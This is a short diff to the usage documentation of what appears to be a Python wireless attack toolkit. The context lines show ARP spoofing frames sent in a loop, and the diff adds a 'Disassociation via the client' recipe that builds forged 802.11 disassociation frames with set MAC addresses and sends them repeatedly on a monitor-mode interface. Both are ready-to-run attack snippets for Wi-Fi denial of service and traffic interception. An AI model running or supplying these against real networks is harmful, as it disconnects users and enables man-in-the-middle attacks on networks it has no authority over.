@@ -210,3 +210,15 @@ z = qs.arps.twoWay()
 qs.sh.qsView()
 qs.sendp(z, iface = 'wlan0', inter = .5, loop = 1)
 ```
+
+#### Disassociation via the client
+```
+%run qs.py
+qs.sh.reason = 8
+qs.sh.macGw = '11:22:33:44:55:55'
+qs.sh.macTx = '11:22:33:44:55:66'
+qs.sh.macRx = '11:22:33:44:55:55'
+x = qs.disassocs.disassoc()
+qs.sh.qsView()
+qs.sendp(x, iface = 'wlan1mon', inter = .5, loop = 1)
+```
